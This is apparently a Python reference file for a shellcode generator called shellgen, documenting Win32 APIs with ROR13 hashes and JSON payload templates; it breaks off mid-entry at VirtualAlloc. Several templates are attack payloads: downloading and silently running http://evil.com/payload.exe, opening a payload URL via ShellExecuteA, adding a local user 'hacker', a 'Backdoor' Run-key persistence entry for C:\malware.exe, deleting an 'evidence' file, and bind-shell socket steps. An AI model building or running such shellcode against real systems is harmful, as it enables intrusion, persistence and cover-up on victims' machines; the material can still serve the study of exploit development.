"""
Win32 API Reference for Shellcode Generation

This file provides a comprehensive reference of commonly used Win32 APIs
with documentation and JSON payload examples for use with shellgen.

Usage:
    1. Find the API you want to use in the sections below
    2. Review the parameters and their meanings
    3. Copy the JSON template and customize for your needs
    4. Use with: ./shellgen.sh --platform windows --json your_payload.json --arch x86

Author: Dawid Esterhuizen
"""

# ==============================================================================
# DYNAMIC LOADING APIs
# ==============================================================================

# ------------------------------------------------------------------------------
# LoadLibraryA - Load a DLL into the process
# ------------------------------------------------------------------------------
"""
LoadLibraryA(lpLibFileName)

Description:
    Loads the specified DLL into the address space of the calling process.
    Returns a module handle that can be used with GetProcAddress.

Parameters:
    lpLibFileName (LPCSTR) - Name or path of the DLL to load

Returns:
    Module handle if successful, NULL if error

DLL: kernel32.dll
ROR13 Hash: 0xec0e4e8e

JSON Example:
"""
LOADLIBRARY_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "LoadLibraryA",
            "dll": "kernel32.dll",
            "args": ["ws2_32.dll"]
        }
        # Module handle is now in EAX - use "REG:eax" in GetProcAddress
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# GetProcAddress - Get function address from a module
# ------------------------------------------------------------------------------
"""
GetProcAddress(hModule, lpProcName)

Description:
    Retrieves the address of an exported function from a DLL.
    Used for dynamic API resolution at runtime.

Parameters:
    hModule (HMODULE)    - Module handle (from LoadLibraryA or "REG:eax")
    lpProcName (LPCSTR)  - Function name to resolve

Returns:
    Function address if successful, NULL if error

DLL: kernel32.dll
ROR13 Hash: 0x7c0dfcaa

JSON Example:
"""
GETPROCADDRESS_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "LoadLibraryA",
            "dll": "kernel32.dll",
            "args": ["user32.dll"]
        },
        {
            "api": "GetProcAddress",
            "dll": "kernel32.dll",
            "args": [
                "REG:eax",      # Module handle from LoadLibraryA
                "MessageBoxA"   # Function to resolve
            ]
        }
        # Function pointer is now in EAX
    ],
    "exit": True
}


# ==============================================================================
# PROCESS EXECUTION APIs
# ==============================================================================

# ------------------------------------------------------------------------------
# WinExec - Simple command execution (legacy but still works)
# ------------------------------------------------------------------------------
"""
WinExec(lpCmdLine, uCmdShow)

Description:
    Executes a program. Simple but limited control over process creation.
    Modern code should use CreateProcess, but this is smaller for shellgen.

Parameters:
    lpCmdLine (LPCSTR)  - Command line to execute (string)
    uCmdShow (UINT)     - How to show the window
                          0 = SW_HIDE (hidden)
                          1 = SW_SHOWNORMAL (normal)
                          5 = SW_SHOW (show)

Returns:
    > 31 if successful, <= 31 if error

DLL: kernel32.dll
ROR13 Hash: 0x0e8afe98

JSON Example:
"""
WINEXEC_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "WinExec",
            "dll": "kernel32.dll",
            "args": [
                "calc.exe",  # Command to execute
                1            # Show window normally
            ]
        }
    ],
    "exit": True
}

WINEXEC_HIDDEN_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "WinExec",
            "dll": "kernel32.dll",
            "args": [
                "cmd.exe /c whoami > C:\\output.txt",  # Hidden command
                0  # SW_HIDE - completely hidden
            ]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# CreateProcessA - Full-featured process creation
# ------------------------------------------------------------------------------
"""
CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes,
               lpThreadAttributes, bInheritHandles, dwCreationFlags,
               lpEnvironment, lpCurrentDirectory, lpStartupInfo,
               lpProcessInformation)

Description:
    Creates a new process with full control over process attributes.
    More complex than WinExec but offers much more control.

Parameters:
    lpApplicationName (LPCSTR)          - Program to execute (can be NULL)
    lpCommandLine (LPSTR)               - Command line string
    lpProcessAttributes (LPSECURITY_ATTRIBUTES) - Process security (usually 0)
    lpThreadAttributes (LPSECURITY_ATTRIBUTES)  - Thread security (usually 0)
    bInheritHandles (BOOL)              - Inherit handles (0 or 1)
    dwCreationFlags (DWORD)             - Creation flags
                                          0x00000000 = Normal
                                          0x08000000 = CREATE_NO_WINDOW
    lpEnvironment (LPVOID)              - Environment block (usually 0)
    lpCurrentDirectory (LPCSTR)         - Working directory (usually 0)
    lpStartupInfo (LPSTARTUPINFOA)      - Pointer to STARTUPINFO (usually REG:esp)
    lpProcessInformation (LPPROCESS_INFORMATION) - Pointer to PROCESS_INFORMATION

Returns:
    Non-zero if successful, 0 if error

DLL: kernel32.dll
ROR13 Hash: 0x16b3fe72

Note: In shellgen, you typically build STARTUPINFO/PROCESS_INFORMATION on stack.
      This is complex - use the built-in createprocess payload instead of JSON.
"""

# ------------------------------------------------------------------------------
# ShellExecuteA - Execute with shell verbs (open, edit, runas, etc.)
# ------------------------------------------------------------------------------
"""
ShellExecuteA(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd)

Description:
    Executes an operation on a file using the shell. Can open files with
    their associated programs, run as admin, open URLs, etc.

Parameters:
    hwnd (HWND)           - Parent window handle (usually 0)
    lpOperation (LPCSTR)  - Operation to perform:
                            "open" - Open file/URL with default program
                            "edit" - Open file with default editor
                            "runas" - Run as administrator
                            "print" - Print document
                            NULL - Default to "open"
    lpFile (LPCSTR)       - File or URL to execute
    lpParameters (LPCSTR) - Parameters to pass (can be NULL/0)
    lpDirectory (LPCSTR)  - Working directory (can be NULL/0)
    nShowCmd (INT)        - How to show window (0=hide, 1=normal, 5=show)

Returns:
    > 32 if successful, <= 32 if error

DLL: shell32.dll
ROR13 Hash: 0x34a8f6f5

JSON Example:
"""
SHELLEXECUTE_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "ShellExecuteA",
            "dll": "shell32.dll",
            "args": [
                0,             # hwnd (no parent window)
                0,             # lpOperation (NULL = default "open")
                "notepad.exe", # File to execute
                0,             # Parameters (none)
                0,             # Directory (current)
                1              # Show window
            ]
        }
    ],
    "exit": True
}

SHELLEXECUTE_URL_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "ShellExecuteA",
            "dll": "shell32.dll",
            "args": [
                0,
                "open",
                "https://evil.com/payload.exe",
                0,
                0,
                1
            ]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# system - C runtime command execution
# ------------------------------------------------------------------------------
"""
system(command)

Description:
    Executes a command using the system's command interpreter (cmd.exe).
    Part of the C runtime library (msvcrt.dll).

Parameters:
    command (const char*) - Command string to execute

Returns:
    Command exit code

DLL: msvcrt.dll
ROR13 Hash: 0xe4a8f8d5

JSON Example:
"""
SYSTEM_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "system",
            "dll": "msvcrt.dll",
            "args": [
                "net user hacker Password123! /add"
            ]
        }
    ],
    "exit": True
}


# ==============================================================================
# FILE OPERATIONS APIs
# ==============================================================================

# ------------------------------------------------------------------------------
# CreateFileA - Create or open a file
# ------------------------------------------------------------------------------
"""
CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
            dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile)

Description:
    Creates or opens a file or device. Returns a handle for file operations.

Parameters:
    lpFileName (LPCSTR)    - File name/path
    dwDesiredAccess (DWORD) - Access mode:
                              0x80000000 = GENERIC_READ
                              0x40000000 = GENERIC_WRITE
                              0xC0000000 = GENERIC_READ | GENERIC_WRITE
    dwShareMode (DWORD)    - Share mode (usually 0 for exclusive)
    lpSecurityAttributes (LPSECURITY_ATTRIBUTES) - Security (usually 0)
    dwCreationDisposition (DWORD) - How to create:
                              1 = CREATE_NEW (fail if exists)
                              2 = CREATE_ALWAYS (overwrite if exists)
                              3 = OPEN_EXISTING (fail if doesn't exist)
                              4 = OPEN_ALWAYS (open or create)
    dwFlagsAndAttributes (DWORD) - File attributes:
                              0x80 = FILE_ATTRIBUTE_NORMAL
                              0x01 = FILE_ATTRIBUTE_READONLY
    hTemplateFile (HANDLE) - Template file (usually 0)

Returns:
    File handle (in EAX) if successful, INVALID_HANDLE_VALUE (-1) if error

DLL: kernel32.dll
ROR13 Hash: 0x7c0017a5

JSON Example:
"""
CREATEFILE_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "CreateFileA",
            "dll": "kernel32.dll",
            "args": [
                "C:\\temp\\output.txt",  # File path
                0x40000000,               # GENERIC_WRITE
                0,                        # No sharing
                0,                        # Default security
                2,                        # CREATE_ALWAYS
                0x80,                     # FILE_ATTRIBUTE_NORMAL
                0                         # No template
            ]
        }
        # Handle is now in EAX - use "REG:eax" in next call
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# WriteFile - Write data to a file
# ------------------------------------------------------------------------------
"""
WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten,
          lpOverlapped)

Description:
    Writes data to a file or device. Use with handle from CreateFileA.

Parameters:
    hFile (HANDLE)        - File handle (from CreateFileA, use "REG:eax")
    lpBuffer (LPCVOID)    - Data to write (string or bytes)
    nNumberOfBytesToWrite (DWORD) - Number of bytes to write
    lpNumberOfBytesWritten (LPDWORD) - Pointer to receive bytes written
                                        (usually "REG:esp" - stack address)
    lpOverlapped (LPOVERLAPPED) - Overlapped I/O (usually 0)

Returns:
    Non-zero if successful, 0 if error

DLL: kernel32.dll
ROR13 Hash: 0xe80a791f

JSON Example:
"""
WRITEFILE_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "CreateFileA",
            "dll": "kernel32.dll",
            "args": ["C:\\temp\\test.txt", 0x40000000, 0, 0, 2, 0x80, 0]
        },
        {
            "api": "WriteFile",
            "dll": "kernel32.dll",
            "args": [
                "REG:eax",         # File handle from CreateFileA
                "Hello, World!\n", # Data to write
                14,                # Number of bytes
                "REG:esp",         # Pointer to bytes written (stack)
                0                  # No overlapped I/O
            ]
        },
        {
            "api": "CloseHandle",
            "dll": "kernel32.dll",
            "args": ["REG:eax"]  # Close the file handle
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# ReadFile - Read data from a file
# ------------------------------------------------------------------------------
"""
ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead,
         lpOverlapped)

Description:
    Reads data from a file or device.

Parameters:
    hFile (HANDLE)        - File handle
    lpBuffer (LPVOID)     - Buffer to receive data (use "REG:esp" for stack)
    nNumberOfBytesToRead (DWORD) - Number of bytes to read
    lpNumberOfBytesRead (LPDWORD) - Pointer to receive bytes read
    lpOverlapped (LPOVERLAPPED) - Overlapped I/O (usually 0)

Returns:
    Non-zero if successful, 0 if error

DLL: kernel32.dll
ROR13 Hash: 0xbb5f9ead
"""

# ------------------------------------------------------------------------------
# CloseHandle - Close an open handle
# ------------------------------------------------------------------------------
"""
CloseHandle(hObject)

Description:
    Closes an open object handle (file, process, thread, etc.).

Parameters:
    hObject (HANDLE) - Handle to close (usually "REG:eax")

Returns:
    Non-zero if successful, 0 if error

DLL: kernel32.dll
ROR13 Hash: 0x0ffd97fb

JSON Example:
"""
CLOSEHANDLE_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "CreateFileA",
            "dll": "kernel32.dll",
            "args": ["C:\\temp\\file.txt", 0x80000000, 0, 0, 3, 0x80, 0]
        },
        # ... do something with the file ...
        {
            "api": "CloseHandle",
            "dll": "kernel32.dll",
            "args": ["REG:eax"]  # Close handle from CreateFileA
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# DeleteFileA - Delete a file
# ------------------------------------------------------------------------------
"""
DeleteFileA(lpFileName)

Description:
    Deletes an existing file.

Parameters:
    lpFileName (LPCSTR) - File path to delete

Returns:
    Non-zero if successful, 0 if error

DLL: kernel32.dll
ROR13 Hash: 0x13dd2ed7

JSON Example:
"""
DELETEFILE_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "DeleteFileA",
            "dll": "kernel32.dll",
            "args": ["C:\\temp\\evidence.txt"]
        }
    ],
    "exit": True
}


# ==============================================================================
# USER INTERFACE APIs
# ==============================================================================

# ------------------------------------------------------------------------------
# MessageBoxA - Display a message box
# ------------------------------------------------------------------------------
"""
MessageBoxA(hWnd, lpText, lpCaption, uType)

Description:
    Displays a modal dialog box with a message.

Parameters:
    hWnd (HWND)       - Parent window (usually 0 for no parent)
    lpText (LPCSTR)   - Message text
    lpCaption (LPCSTR) - Title bar text
    uType (UINT)      - Button and icon type:
                        0x00 = MB_OK
                        0x01 = MB_OKCANCEL
                        0x10 = MB_ICONHAND (error icon)
                        0x20 = MB_ICONQUESTION
                        0x30 = MB_ICONEXCLAMATION
                        0x40 = MB_ICONINFORMATION

Returns:
    Button pressed ID

DLL: user32.dll
ROR13 Hash: 0xbc4da2a8

JSON Example:
"""
MESSAGEBOX_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "MessageBoxA",
            "dll": "user32.dll",
            "args": [
                0,              # No parent window
                "You have been pwned!",  # Message
                "Warning",      # Title
                0x30            # Exclamation icon with OK button
            ]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# MessageBoxW - Display a message box (Unicode version)
# ------------------------------------------------------------------------------
"""
MessageBoxW(hWnd, lpText, lpCaption, uType)

Description:
    Displays a modal dialog box with a message. Unicode (wide-character) version.
    On modern Windows, MessageBoxA internally calls MessageBoxW.

Parameters:
    hWnd (HWND)       - Parent window (usually 0 for no parent)
    lpText (LPCWSTR)  - Message text (Unicode/UTF-16 string)
    lpCaption (LPCWSTR) - Title bar text (Unicode/UTF-16 string)
    uType (UINT)      - Button and icon type (same as MessageBoxA):
                        0x00 = MB_OK
                        0x01 = MB_OKCANCEL
                        0x10 = MB_ICONHAND (error icon)
                        0x20 = MB_ICONQUESTION
                        0x30 = MB_ICONEXCLAMATION
                        0x40 = MB_ICONINFORMATION

Returns:
    Button pressed ID

DLL: user32.dll
ROR13 Hash: 0x8f497d9c

Note: Unicode strings must be encoded as UTF-16LE (2 bytes per character).
      In JSON payloads, use regular strings - they'll be auto-converted.
      For manual assembly, each character becomes 2 bytes: "A" = 0x41 0x00

JSON Example:
"""
MESSAGEBOXW_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "MessageBoxW",
            "dll": "user32.dll",
            "args": [
                0,
                "Unicode message: \u2665",  # Heart symbol
                "Unicode Title",
                0x40  # Information icon
            ]
        }
    ],
    "exit": True
}


# ==============================================================================
# NETWORK APIs
# ==============================================================================

# ------------------------------------------------------------------------------
# URLDownloadToFileA - Download a file from URL
# ------------------------------------------------------------------------------
"""
URLDownloadToFileA(pCaller, szURL, szFileName, dwReserved, lpfnCB)

Description:
    Downloads a file from the internet and saves it to disk.

Parameters:
    pCaller (LPUNKNOWN)  - Calling object (usually 0)
    szURL (LPCSTR)       - URL to download from
    szFileName (LPCSTR)  - Local path to save file
    dwReserved (DWORD)   - Reserved (must be 0)
    lpfnCB (LPBINDSTATUSCALLBACK) - Callback function (usually 0)

Returns:
    S_OK (0) if successful, error code otherwise

DLL: urlmon.dll
ROR13 Hash: 0xc69f8957

JSON Example:
"""
URLDOWNLOADTOFILE_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "URLDownloadToFileA",
            "dll": "urlmon.dll",
            "args": [
                0,                              # pCaller
                "http://evil.com/payload.exe",  # URL
                "C:\\temp\\payload.exe",        # Save path
                0,                              # Reserved
                0                               # No callback
            ]
        },
        {
            "api": "WinExec",
            "dll": "kernel32.dll",
            "args": ["C:\\temp\\payload.exe", 0]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# WSAStartup - Initialize Winsock
# ------------------------------------------------------------------------------
"""
WSAStartup(wVersionRequired, lpWSAData)

Description:
    Initializes Winsock for network operations. Must be called before
    using socket functions.

Parameters:
    wVersionRequired (WORD) - Winsock version (usually 0x0202 for 2.2)
    lpWSAData (LPWSADATA)   - Pointer to WSADATA structure (use "REG:esp")

Returns:
    0 if successful, error code otherwise

DLL: ws2_32.dll
ROR13 Hash: 0x3bfcedcb

Note: Usually handled by built-in reverse_shell payload, not JSON.
"""

# ------------------------------------------------------------------------------
# WSASocketA - Create a socket
# ------------------------------------------------------------------------------
"""
WSASocketA(af, type, protocol, lpProtocolInfo, g, dwFlags)

Description:
    Creates a socket for network communication.

Parameters:
    af (int)       - Address family (2 = AF_INET for IPv4)
    type (int)     - Socket type (1 = SOCK_STREAM for TCP)
    protocol (int) - Protocol (6 = IPPROTO_TCP)
    lpProtocolInfo (LPWSAPROTOCOL_INFOA) - Protocol info (usually 0)
    g (GROUP)      - Reserved (0)
    dwFlags (DWORD) - Socket flags (usually 0)

Returns:
    Socket handle if successful, INVALID_SOCKET otherwise

DLL: ws2_32.dll
ROR13 Hash: 0xadf509d9

Note: Usually handled by built-in reverse_shell payload.
"""

# ------------------------------------------------------------------------------
# WSAConnect - Connect a socket (Winsock extended version)
# ------------------------------------------------------------------------------
"""
WSAConnect(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS)

Description:
    Establishes a connection to another socket application.
    Extended version of connect() with QoS support.

Parameters:
    s (SOCKET)      - Socket descriptor (from WSASocketA)
    name (const struct sockaddr*) - Address to connect to (sockaddr_in structure)
    namelen (int)   - Length of name (16 for sockaddr_in)
    lpCallerData (LPWSABUF)  - Caller data (usually 0)
    lpCalleeData (LPWSABUF)  - Callee data (usually 0)
    lpSQOS (LPQOS)  - Socket QoS (usually 0)
    lpGQOS (LPQOS)  - Group QoS (usually 0)

Returns:
    0 if successful, SOCKET_ERROR (-1) otherwise

DLL: ws2_32.dll
ROR13 Hash: 0xb32dba0c

Note: Usually handled by built-in reverse_shell payload.
"""

# ------------------------------------------------------------------------------
# socket - Create a socket (standard BSD version)
# ------------------------------------------------------------------------------
"""
socket(af, type, protocol)

Description:
    Creates a socket for network communication. Standard BSD socket API.

Parameters:
    af (int)       - Address family (2 = AF_INET for IPv4)
    type (int)     - Socket type (1 = SOCK_STREAM for TCP, 2 = SOCK_DGRAM for UDP)
    protocol (int) - Protocol (0 = automatic, 6 = TCP, 17 = UDP)

Returns:
    Socket handle if successful, INVALID_SOCKET (-1) otherwise

DLL: ws2_32.dll
ROR13 Hash: 0x6174a599

JSON Example:
"""
SOCKET_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "WSAStartup",
            "dll": "ws2_32.dll",
            "args": [0x0202, "REG:esp"]  # Version 2.2
        },
        {
            "api": "socket",
            "dll": "ws2_32.dll",
            "args": [
                2,   # AF_INET (IPv4)
                1,   # SOCK_STREAM (TCP)
                6    # IPPROTO_TCP
            ]
        }
        # Socket handle is now in EAX
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# connect - Connect a socket to an address
# ------------------------------------------------------------------------------
"""
connect(s, name, namelen)

Description:
    Establishes a connection to a specified address.

Parameters:
    s (SOCKET)      - Socket descriptor
    name (const struct sockaddr*) - Address to connect to (sockaddr_in)
    namelen (int)   - Size of name structure (16 for sockaddr_in)

Returns:
    0 if successful, SOCKET_ERROR (-1) otherwise

DLL: ws2_32.dll
ROR13 Hash: 0x4a5af2f9

Note: Usually handled by built-in reverse_shell payload.
Build sockaddr_in on stack with: sin_family=2, sin_port (network byte order), sin_addr
"""

# ------------------------------------------------------------------------------
# bind - Bind a socket to an address
# ------------------------------------------------------------------------------
"""
bind(s, name, namelen)

Description:
    Associates a local address with a socket.

Parameters:
    s (SOCKET)      - Socket descriptor
    name (const struct sockaddr*) - Local address (sockaddr_in)
    namelen (int)   - Size of name structure (16)

Returns:
    0 if successful, SOCKET_ERROR (-1) otherwise

DLL: ws2_32.dll
ROR13 Hash: 0xf0b5a256

JSON Example:
"""
BIND_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "WSAStartup",
            "dll": "ws2_32.dll",
            "args": [0x0202, "REG:esp"]
        },
        {
            "api": "socket",
            "dll": "ws2_32.dll",
            "args": [2, 1, 6]
        },
        # Build sockaddr_in on stack: family=2, port=4444, addr=0.0.0.0
        {
            "api": "bind",
            "dll": "ws2_32.dll",
            "args": [
                "REG:eax",  # Socket from socket()
                "REG:esp",  # sockaddr_in on stack
                16          # Size
            ]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# listen - Listen for incoming connections
# ------------------------------------------------------------------------------
"""
listen(s, backlog)

Description:
    Places a socket in a state to listen for incoming connections.

Parameters:
    s (SOCKET)  - Bound socket descriptor
    backlog (int) - Maximum queue length (usually 1-5)

Returns:
    0 if successful, SOCKET_ERROR (-1) otherwise

DLL: ws2_32.dll
ROR13 Hash: 0x38d42e6d

JSON Example:
"""
LISTEN_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # After socket() and bind()
        {
            "api": "listen",
            "dll": "ws2_32.dll",
            "args": [
                "REG:eax",  # Socket
                2           # Backlog (max 2 pending connections)
            ]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# accept - Accept an incoming connection
# ------------------------------------------------------------------------------
"""
accept(s, addr, addrlen)

Description:
    Accepts an incoming connection on a listening socket.

Parameters:
    s (SOCKET)       - Listening socket descriptor
    addr (struct sockaddr*) - Receives client address (or 0 to ignore)
    addrlen (int*)   - Size of addr buffer (or 0 to ignore)

Returns:
    New socket for the accepted connection, INVALID_SOCKET (-1) on error

DLL: ws2_32.dll
ROR13 Hash: 0xc7fb08d0

JSON Example:
"""
ACCEPT_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # After socket(), bind(), listen()
        {
            "api": "accept",
            "dll": "ws2_32.dll",
            "args": [
                "REG:eax",  # Listening socket
                0,          # Don't need client address
                0           # Don't need address length
            ]
        }
        # New client socket is in EAX
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# send - Send data on a socket
# ------------------------------------------------------------------------------
"""
send(s, buf, len, flags)

Description:
    Sends data on a connected socket.

Parameters:
    s (SOCKET)      - Connected socket descriptor
    buf (const char*) - Buffer containing data to send
    len (int)       - Number of bytes to send
    flags (int)     - Flags (usually 0)

Returns:
    Number of bytes sent, SOCKET_ERROR (-1) on error

DLL: ws2_32.dll
ROR13 Hash: 0x5f38ebc2

JSON Example:
"""
SEND_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # After successful connect() or accept()
        {
            "api": "send",
            "dll": "ws2_32.dll",
            "args": [
                "REG:eax",           # Socket
                "GET / HTTP/1.0\r\n\r\n",  # Data to send
                18,                  # Length
                0                    # No flags
            ]
        }
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# recv - Receive data from a socket
# ------------------------------------------------------------------------------
"""
recv(s, buf, len, flags)

Description:
    Receives data from a connected socket.

Parameters:
    s (SOCKET)  - Connected socket descriptor
    buf (char*) - Buffer to receive data (use "REG:esp" for stack)
    len (int)   - Maximum number of bytes to receive
    flags (int) - Flags (usually 0)

Returns:
    Number of bytes received, 0 if connection closed, SOCKET_ERROR (-1) on error

DLL: ws2_32.dll
ROR13 Hash: 0x5fc8d902

JSON Example:
"""
RECV_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # After successful connect() or accept()
        {
            "api": "recv",
            "dll": "ws2_32.dll",
            "args": [
                "REG:eax",   # Socket
                "REG:esp",   # Buffer (stack)
                1024,        # Max bytes to receive
                0            # No flags
            ]
        }
        # Data is now on stack, EAX contains bytes received
    ],
    "exit": True
}

# ------------------------------------------------------------------------------
# closesocket - Close a socket
# ------------------------------------------------------------------------------
"""
closesocket(s)

Description:
    Closes an existing socket and releases resources.

Parameters:
    s (SOCKET) - Socket descriptor to close

Returns:
    0 if successful, SOCKET_ERROR (-1) otherwise

DLL: ws2_32.dll
ROR13 Hash: 0x23e2d9f1

JSON Example:
"""
CLOSESOCKET_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # After done with socket operations
        {
            "api": "closesocket",
            "dll": "ws2_32.dll",
            "args": ["REG:eax"]  # Socket to close
        }
    ],
    "exit": True
}


# ==============================================================================
# REGISTRY APIs
# ==============================================================================

# ------------------------------------------------------------------------------
# RegCreateKeyExA - Create or open a registry key
# ------------------------------------------------------------------------------
"""
RegCreateKeyExA(hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired,
                lpSecurityAttributes, phkResult, lpdwDisposition)

Description:
    Creates or opens a registry key.

Parameters:
    hKey (HKEY)      - Predefined registry key:
                       0x80000000 = HKEY_CLASSES_ROOT
                       0x80000001 = HKEY_CURRENT_USER
                       0x80000002 = HKEY_LOCAL_MACHINE
                       0x80000003 = HKEY_USERS
    lpSubKey (LPCSTR) - Subkey path
    Reserved (DWORD)  - Reserved (0)
    lpClass (LPSTR)   - Key class (usually 0)
    dwOptions (DWORD) - Options (0 = REG_OPTION_NON_VOLATILE)
    samDesired (REGSAM) - Access rights (0xF003F = KEY_ALL_ACCESS)
    lpSecurityAttributes - Security (usually 0)
    phkResult (PHKEY) - Receives key handle (use "REG:esp")
    lpdwDisposition (LPDWORD) - Disposition (use "REG:esp")

Returns:
    ERROR_SUCCESS (0) if successful

DLL: advapi32.dll
ROR13 Hash: 0x7e9d4bc3
"""

# ------------------------------------------------------------------------------
# RegSetValueExA - Set a registry value
# ------------------------------------------------------------------------------
"""
RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData, cbData)

Description:
    Sets data for a registry value.

Parameters:
    hKey (HKEY)       - Registry key handle
    lpValueName (LPCSTR) - Value name (or 0 for default)
    Reserved (DWORD)  - Reserved (0)
    dwType (DWORD)    - Value type:
                        1 = REG_SZ (string)
                        4 = REG_DWORD (32-bit number)
    lpData (const BYTE*) - Data to set
    cbData (DWORD)    - Size of data in bytes

Returns:
    ERROR_SUCCESS (0) if successful

DLL: advapi32.dll
ROR13 Hash: 0x8e4e0eeb

JSON Example:
"""
REGSETVALUE_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "RegCreateKeyExA",
            "dll": "advapi32.dll",
            "args": [
                0x80000001,  # HKEY_CURRENT_USER
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, 0, 0, 0xF003F, 0, "REG:esp", "REG:esp"
            ]
        },
        {
            "api": "RegSetValueExA",
            "dll": "advapi32.dll",
            "args": [
                "REG:eax",              # Key handle from RegCreateKeyExA
                "Backdoor",             # Value name
                0,                      # Reserved
                1,                      # REG_SZ (string)
                "C:\\malware.exe",      # Data
                16                      # Data size
            ]
        },
        {
            "api": "RegCloseKey",
            "dll": "advapi32.dll",
            "args": ["REG:eax"]
        }
    ],
    "exit": True
}


# ==============================================================================
# PROCESS/THREAD APIs
# ==============================================================================

# ------------------------------------------------------------------------------
# GetCurrentProcess - Get current process handle
# ------------------------------------------------------------------------------
"""
GetCurrentProcess(void)

Description:
    Returns a pseudo-handle to the current process.

Parameters:
    None

Returns:
    Pseudo-handle to current process

DLL: kernel32.dll
ROR13 Hash: 0x7b8f17e6
"""

# ------------------------------------------------------------------------------
# TerminateProcess - Terminate a process
# ------------------------------------------------------------------------------
"""
TerminateProcess(hProcess, uExitCode)

Description:
    Terminates the specified process.

Parameters:
    hProcess (HANDLE) - Process handle (use "REG:eax" from GetCurrentProcess)
    uExitCode (UINT)  - Exit code (usually 0)

Returns:
    Non-zero if successful, 0 if error

DLL: kernel32.dll
ROR13 Hash: 0x78b5b983

JSON Example:
"""
TERMINATEPROCESS_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        # ... your payload code ...
        {
            "api": "GetCurrentProcess",
            "dll": "kernel32.dll",
            "args": []
        },
        {
            "api": "TerminateProcess",
            "dll": "kernel32.dll",
            "args": [
                "REG:eax",  # Process handle from GetCurrentProcess
                0           # Exit code
            ]
        }
    ],
    "exit": False  # Already exiting via TerminateProcess
}

# ------------------------------------------------------------------------------
# ExitProcess - Terminate the calling process
# ------------------------------------------------------------------------------
"""
ExitProcess(uExitCode)

Description:
    Ends the calling process and all its threads. This is the standard
    way to exit from a program. Cleaner than TerminateProcess.

Parameters:
    uExitCode (UINT) - Exit code for the process (usually 0)

Returns:
    Does not return (terminates process)

DLL: kernel32.dll
ROR13 Hash: 0x73e2d87e

JSON Example:
"""
EXITPROCESS_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "MessageBoxA",
            "dll": "user32.dll",
            "args": [0, "Done!", "Info", 0]
        },
        {
            "api": "ExitProcess",
            "dll": "kernel32.dll",
            "args": [0]  # Exit with code 0
        }
    ],
    "exit": False  # Already exiting via ExitProcess
}

# ------------------------------------------------------------------------------
# Sleep - Suspend execution for a time period
# ------------------------------------------------------------------------------
"""
Sleep(dwMilliseconds)

Description:
    Suspends execution for the specified time.

Parameters:
    dwMilliseconds (DWORD) - Time to sleep in milliseconds

Returns:
    None

DLL: kernel32.dll
ROR13 Hash: 0xe035f044

JSON Example:
"""
SLEEP_EXAMPLE = {
    "bad_chars": [0, 10, 13],
    "calls": [
        {
            "api": "MessageBoxA",
            "dll": "user32.dll",
            "args": [0, "Click OK to wait 5 seconds", "Timer", 0]
        },
        {
            "api": "Sleep",
            "dll": "kernel32.dll",
            "args": [5000]  # Sleep for 5000ms (5 seconds)
        },
        {
            "api": "MessageBoxA",
            "dll": "user32.dll",
            "args": [0, "Done waiting!", "Timer", 0]
        }
    ],
    "exit": True
}


# ==============================================================================
# MEMORY MANAGEMENT APIs
# ==============================================================================

# ------------------------------------------------------------------------------
# VirtualAlloc - Allocate memory
# ------------------------------------------------------------------------------
"""
VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)

Description:
    Reserves, commits, or changes the state of memory pages.

Parameters:
    lpAddress (LPVOID) - Desired address (usually 0 for automatic)
